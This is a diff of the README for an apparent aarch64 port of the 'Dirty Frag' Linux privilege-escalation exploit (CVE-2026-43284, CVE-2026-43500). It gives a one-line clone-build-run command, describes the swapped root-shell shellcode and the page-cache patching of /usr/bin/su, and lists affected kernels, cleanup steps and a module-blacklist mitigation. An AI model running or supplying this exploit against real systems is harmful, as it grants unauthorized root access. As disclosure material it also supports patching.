@@ -1,89 +1,133 @@
-# Dirty Frag: Universal Linux LPE
+# Dirty Frag (aarch64 port)
 
-<p align="center">
-  <img src="assets/tux.png" width="400" alt="tux">
-</p>
+> Port of [V4bel/dirtyfrag](https://github.com/V4bel/dirtyfrag) to 64-bit ARM (aarch64).
+> The original vulnerability discovery, write-up, and exploit are by
+> **[Hyunwoo Kim (@v4bel)](https://x.com/v4bel)**. This repository only adapts the
+> embedded payload and verification logic so the exploit lands on aarch64 Linux.
 
-# Abstract
+## Abstract
 
-![tux](assets/demo.gif)
+Dirty Frag chains two page-cache write vulnerabilities — `xfrm-ESP Page-Cache Write
+(CVE-2026-43284)` and `RxRPC Page-Cache Write (CVE-2026-43500)` — into a universal
+local privilege escalation. The upstream PoC ships with an x86_64-only payload
+(both the planted ELF and the verification logic). On aarch64 distributions the
+underlying kernel bugs are still present and the **xfrm-ESP primitive itself works
+unmodified** — only the userspace logic prematurely declares failure because it
+checks for x86 byte signatures.
 
-This document describes the Dirty Frag vulnerability class, first discovered and reported by [Hyunwoo Kim (@v4bel)](https://x.com/v4bel), which can obtain root privileges on major Linux distributions by chaining the `xfrm-ESP Page-Cache Write (CVE-2026-43284)` vulnerability and the `RxRPC Page-Cache Write (CVE-2026-43500)` vulnerability.
+This port replaces:
 
-Dirty Frag is a case that extends the bug class to which [Dirty Pipe](https://dirtypipe.cm4all.com/) and [Copy Fail](https://copy.fail/) belong. Because it is a deterministic logic bug that does not depend on a timing window, no race condition is required, the kernel does not panic when the exploit fails, and the success rate is very high.
+1. the 192-byte embedded x86_64 root-shell ELF with an aarch64 equivalent
+   (`e_machine = 0xb7`, `MOVZ` / `SVC #0` shellcode, aarch64 syscall numbers
+   `setgid=144`, `setuid=146`, `setgroups=159`, `execve=221`);
+2. the post-write `verify_byte()` check, which previously looked for the x86
+   prologue `0x31 0xff` at the entry offset — now checks for the aarch64
+   `MOVZ` opcode bytes `0x80 0xd2` at offsets `0x7a/0x7b`;
+3. the `su_marker[]` array used by `su_already_patched()` — now holds the first
+   eight bytes of the aarch64 shellcode (`00 00 80 d2 08 12 80 d2`).
 
-For detailed technical information and the timeline, [see here](assets/write-up.md).
+These are the only three changes against upstream. The kernel-side primitive
+(`xfrm-ESP` page-cache write via `splice` + `vmsplice`) is unchanged.
 
-- `xfrm-ESP Page-Cache Write (CVE-2026-43284)` was patched in mainline [f4c50a4034e6](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e62ab75f1d5cdd191dd5f9c77fdff4).
-- `RxRPC Page-Cache Write (CVE-2026-43500)` was patched in mainline [aa54b1d27fe0](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=aa54b1d27fe0c2b78e664a34fd0fdf7cd1960d71).
+## What works / what doesn't on aarch64
 
-> [!NOTE]
-> At the time this document was first made public (2026-05-07), the embargo had been broken due to external factors, so no patch or CVE existed yet. After consultation with the maintainers on linux-distros@vs.openwall.org at that time, the Dirty Frag document was published at their request. For the disclosure timeline, refer to the technical details.
+| Leg                           | x86_64 | aarch64        | Notes                                                                                                                                              |
+| ----------------------------- | ------ | -------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `xfrm-ESP` page-cache write   | works  | **works**      | Uses real `struct page*` via `splice` from the target file. Cache-coherency differences do not affect the write path.                              |
+| `RxRPC` page-cache write      | works  | **kernel oops**| Supplies a fabricated `struct page*` that x86 `flush_dcache_page()` ignores (no-op) but aarch64 dereferences (real cache flush) → translation fault. |
 
-# Exploiting
+Because the xfrm-ESP leg succeeds on aarch64, the rxrpc fallback is unnecessary
+and the exploit obtains a root shell through the same flow as upstream.
 
-## One-line special
+If you only have access to a distribution that blocks unprivileged user-namespace
+creation (e.g., Ubuntu under AppArmor), the xfrm-ESP leg will not run. On those
+systems the rxrpc fallback is currently not portable to aarch64 — see
+*Limitations* below.
+
+## Exploiting
 
 ```
-git clone https://github.com/V4bel/dirtyfrag.git && cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp
+git clone https://github.com/Zi1chs/dirtyfrag.git && \
+  cd dirtyfrag-aarch64 && \
+  gcc -O0 -Wall -o exp exp.c -lutil && \
+  ./exp
 ```
 
-This PoC is provided as accurate information following consultation with linux-distros. Do not use it on systems that you are not authorized to test.
+Pass `-v` or set `DIRTYFRAG_VERBOSE=1` to see the patching progress.
+
+This PoC is for authorized testing only. Do not run it on systems you do not
+own or are not contracted to test.
 
 ## Cleanup
 
-⚠️  **Important:** After running this exploit, the page cache is contaminated. To clear the polluted page cache and ensure system stability, either run:
+After running the exploit, the page cache for `/usr/bin/su` is polluted. Either
+drop the caches or reboot:
 
-```bash
-echo 3 > /proc/sys/vm/drop_caches
+```
+echo 3 | sudo tee /proc/sys/vm/drop_caches
 ```
 
-or reboot the system.
+The on-disk binary is not modified — only the in-memory page cache is.
 
-# Affected Versions
+## Tested
 
-- **CVE-2026-43284**: xfrm-ESP Page-Cache Write vulnerability is in scope from [cac2661c53f3 (2017-01-17)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=cac2661c53f3) up to [f4c50a4034e6 (2026-05-05)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e62ab75f1d5cdd191dd5f9c77fdff4).
-- **CVE-2026-43500**: RxRPC Page-Cache Write vulnerability is in scope from [2dc334f1a63a (2023-06-08)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=2dc334f1a63a) up to [aa54b1d27fe0 (2026-05-10)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=aa54b1d27fe0c2b78e664a34fd0fdf7cd1960d71).
+- Kali ARM (Apple Silicon, VMware Fusion), kernel `6.19.11+kali-arm64`, glibc
+  built for `aarch64-linux-gnu`. Both modules `esp4` and `xfrm_user` autoload
+  cleanly on first use; unprivileged user namespaces are enabled by default.
 
-In other words, the effective lifetime of the vulnerabilities is about 9 years.
+If you test this on additional aarch64 distributions (Raspberry Pi OS, Ubuntu
+Server for ARM, openSUSE aarch64, Fedora aarch64, Amazon Linux 2023 aarch64,
+Oracle Linux ARM, etc.) please open an issue or PR with the kernel version and
+result.
 
-This Dirty Frag has been tested on the following distribution versions.
+## Affected versions
 
-- Ubuntu 24.04.4: 6.17.0-23-generic
-- RHEL 10.1: 6.12.0-124.49.1.el10_1.x86_64
-- openSUSE Tumbleweed: 7.0.2-1-default
-- CentOS Stream 10: 6.12.0-224.el10.x86_64
-- AlmaLinux 10: 6.12.0-124.52.3.el10_1.x86_64
-- Fedora 44: 6.19.14-300.fc44.x86_64
-- ...
+Same scope as upstream — these are kernel bugs, not architecture-specific:
 
-# Mitigation
+- **CVE-2026-43284** (xfrm-ESP): `cac2661c53f3` (2017-01-17) → `f4c50a4034e6` (2026-05-05)
+- **CVE-2026-43500** (RxRPC):     `2dc334f1a63a` (2023-06-08) → `aa54b1d27fe0` (2026-05-10)
 
-1. Use the following command to remove the modules in which the vulnerabilities occur and clear the page cache.
-```bash
-sh -c "printf 'install esp4 /bin/false\ninstall esp6 /bin/false\ninstall rxrpc /bin/false\n' > /etc/modprobe.d/dirtyfrag.conf; rmmod esp4 esp6 rxrpc 2>/dev/null; echo 3 > /proc/sys/vm/drop_caches; true"
+Kernels built before those fix commits are vulnerable. As of this port's
+publication the patches are in mainline but have not yet been backported to
+every aarch64 distribution.
+
+## Mitigation
+
+Same as upstream:
+
+```
+sudo sh -c "printf 'install esp4 /bin/false\ninstall esp6 /bin/false\ninstall rxrpc /bin/false\n' \
+  > /etc/modprobe.d/dirtyfrag.conf; rmmod esp4 esp6 rxrpc 2>/dev/null; \
+  echo 3 > /proc/sys/vm/drop_caches; true"
 ```
 
-2. Once each distribution backports a patch, update accordingly.
+Update to a kernel that includes both fix commits as soon as your distribution
+ships the backport.
 
-# FAQ
+## Limitations
 
-## Why did you chain two vulnerabilities?
+- **rxrpc fallback is not ported.** On aarch64 the rxrpc primitive faults the
+  kernel in `flush_dcache_page` because of how the bug constructs a fake
+  `struct page*`. Making that leg work would require a different page-supply
+  technique (real backing page that aliases the target file's page cache),
+  which is a research problem, not a code change.
+- **Only `/usr/bin/su` is patched.** The `/etc/passwd` backdoor path used by
+  the rxrpc leg is unavailable on aarch64 for the reason above. If your target
+  distribution restricts unprivileged userns and you cannot use the xfrm-ESP
+  leg either, this port will not give you root.
 
-xfrm-ESP Page-Cache Write provides a powerful arbitrary 4-byte STORE primitive like Copy Fail, and is included on most distributions, but it requires the privilege to create a namespace. 
+## Credit
 
-Ubuntu sometimes blocks unprivileged user namespace creation through AppArmor policy. In such an environment, xfrm-ESP Page-Cache Write cannot be triggered. RxRPC Page-Cache Write does not require the privilege to create a namespace, but the `rxrpc.ko` module itself is not included in most distributions. However, on Ubuntu, the `rxrpc.ko` module is loaded by default. 
+- Original vulnerability discovery, write-up, and exploit: **Hyunwoo Kim
+  ([@v4bel](https://x.com/v4bel))** — see upstream repo
+  [V4bel/dirtyfrag](https://github.com/V4bel/dirtyfrag) and the technical
+  write-up linked from there.
+- aarch64 port (this repo): payload + verification adapted to aarch64 only;
+  all kernel-exploitation logic is upstream's.
 
-Chaining the two variants makes the blind spots cover each other, allowing root privileges to be obtained on every major distribution. For details, refer to the technical details document.
+## License
 
-## Another "branded" "Dirty" series?
-
-Yeah, yeah, I know. However, this vulnerability is a descendant of "Dirty Pipe", and it is a bug class that "dirties" the `frag` member of `struct sk_buff`, so this name is the most appropriate.
-
-## What is its relationship with the "Copy Fail" vulnerability?
-
-Copy Fail was the motivation for starting this research. In particular, xfrm-ESP Page-Cache Write in the Dirty Frag vulnerability chain shares the same sink as Copy Fail. However, it is triggered regardless of whether the algif_aead module is available. In other words, even on systems where the publicly known Copy Fail mitigation (algif_aead blacklist) is applied, your Linux is still vulnerable to Dirty Frag.
-
-## So, how do I fix my Linux?
-
-Refer to the Mitigation section above.
+The upstream repository does not ship an explicit license file. This fork
+preserves attribution and is published for security-research purposes only.
+If the upstream author requests removal or relicensing, please open an issue
+and the repository will be updated accordingly.
